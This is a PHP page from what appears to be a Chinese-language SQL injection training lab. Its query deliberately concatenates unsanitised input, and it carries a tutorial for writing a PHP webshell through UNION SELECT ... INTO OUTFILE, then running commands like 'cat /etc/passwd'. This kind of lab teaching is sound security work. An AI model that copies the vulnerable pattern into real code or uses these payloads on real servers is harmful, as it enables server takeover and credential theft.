<?php
header("Content-Type: text/html; charset=utf-8");
$mysqli = new mysqli("db", "sqli", "sqli123", "sqli_lab");
$mysqli->set_charset("utf8mb4");

if ($mysqli->connect_error) {
    die("連線失敗: " . $mysqli->connect_error);
}

$id = $_GET['id'] ?? '';

echo "<h2>📂 INTO OUTFILE - 寫入 WebShell 測試</h2>";

$query = "SELECT id, name, description FROM products WHERE id = $id";
echo "<p><strong>執行的 SQL：</strong><code>" . $query . "</code></p>";

if ($id !== '') {
    $result = $mysqli->query($query);

    if ($result) {
        if ($result->num_rows > 0) {
            echo "<table border='1' cellpadding='6' cellspacing='0'>";
            echo "<tr><th>ID</th><th>名稱</th><th>描述</th></tr>";
            while ($row = $result->fetch_assoc()) {
                echo "<tr>";
                echo "<td>" . htmlspecialchars((string)$row['id']) . "</td>";
                echo "<td>" . $row['name'] . "</td>";
                echo "<td>" . $row['description'] . "</td>";
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "<p style='color:orange;'>⚠️ 查無資料（但 SQL 語法正確）</p>";
        }
    } else {
        echo "<p style='color:red;'>❌ SQL 錯誤：{$mysqli->error}</p>";
    }
} else {
    echo "<p style='color:gray;'>請在網址加上 <code>?id=1</code> 開始測試。</p>";
}
?>

<hr>
<h3>💡 INTO OUTFILE WebShell 寫入教學</h3>

<h4>前置條件</h4>
<ul>
  <li>MySQL 帳號需有 <code>FILE</code> 權限</li>
  <li>MySQL 的 <code>secure_file_priv</code> 必須為空值（本 Lab 已設定）</li>
  <li>寫入路徑必須是 Web Server 可存取的目錄</li>
</ul>

<h4>Step 1 — 確認欄位數</h4>
<ul>
  <li><code>?id=1 ORDER BY 3--+</code> ← 正常</li>
  <li><code>?id=1 ORDER BY 4--+</code> ← 報錯 → 確認有 3 個欄位</li>
</ul>

<h4>Step 2 — 確認 secure_file_priv</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,@@secure_file_priv,3--+</code> ← 應為空值才能寫入任意路徑</li>
</ul>

<h4>Step 3 — 寫入 WebShell</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,"&lt;?php echo shell_exec($_GET['c']);?&gt;",3 INTO OUTFILE '/var/www/html/shell.php'--+</code></li>
</ul>

<h4>Step 4 — 執行指令</h4>
<ul>
  <li>成功後存取：<code>/shell.php?c=id</code></li>
  <li><code>/shell.php?c=cat /etc/passwd</code></li>
  <li><code>/shell.php?c=ls /var/www/html</code></li>
</ul>

<p>⚠️ 注意：若檔案已存在會報錯 <code>File already exists</code>，換個檔名即可。</p>
<p>⚠️ 實務中路徑需透過其他方式探測，例如 <code>@@datadir</code>、錯誤訊息洩漏等。</p>
<p><a href="index.php">← 回到總覽</a></p>
